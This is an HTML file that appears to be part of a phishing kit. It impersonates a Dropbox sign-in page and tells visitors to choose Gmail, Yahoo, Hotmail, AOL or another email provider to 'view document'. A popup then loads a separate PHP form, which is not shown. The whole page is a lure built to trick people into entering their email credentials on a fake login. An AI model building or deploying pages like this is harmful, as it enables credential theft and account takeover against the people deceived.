<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Dropbox - Sign in</title>
<link rel="shortcut icon" href="favicon.ico" />
<link rel="stylesheet" href="css/style.css" />
<link rel="stylesheet" href="css/styleTinybox.css" />

<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/popup.js"></script>
<script type="text/javascript" src="js/global.js"></script>
</head>

<body onload="openOffersDialog();">

	<div id="maincover">
    	<img src="images/logo.png" class="logo" />
        <div class="line"></div>
        <div id="dropboxmaincontent">
       	  <table>
              <tr>
                <td class="mainlogo" valign="middle"><img src="images/sign-in-vflvTYLtt.png" width="288" height="305" /></td>
                <td valign="top">
               	  <h1>Select your email provider</h1>
                    <h5>Now , you can sign in to dropbox with your email to view document</h5>
                	<table>
                      <tr>
                        <td><img src="images/gmail.jpg" onclick="openOffersDialoggmail()" /></td>
                        <td><img src="images/yahoo.jpg" onclick="openOffersDialogyahoo()" /></td>
                      </tr>
                      <tr>
                        <td><img src="images/hotmail.jpg" onclick="openOffersDialoghotmail()" /></td>
                        <td><img src="images/aol.jpg" onclick="openOffersDialogaol()" /></td>
                      </tr>
                      <tr>
                        <td><img src="images/other.jpg" onclick="openOffersDialogother()" /></td>
                        <td>&nbsp;</td>
                      </tr>
                    </table>
                </td>
              </tr>
          </table>
        </div>
        <script type="text/javascript" src="js/tinybox.js"></script>
        <div id="overlay" class="overlay"></div>

<!---<a onclick="openOffersDialog2();">Click Here To See The PopUp</a> //--->



<div id="boxpopup" class="box">
	
    
    <a onclick="closeOffersDialog('boxpopup');" class="boxclose"></a>
    
    
    
	<div id="content">
	<?php include('form.php');?> 
	</div>
</div>
    </div> 
</body>
</html>
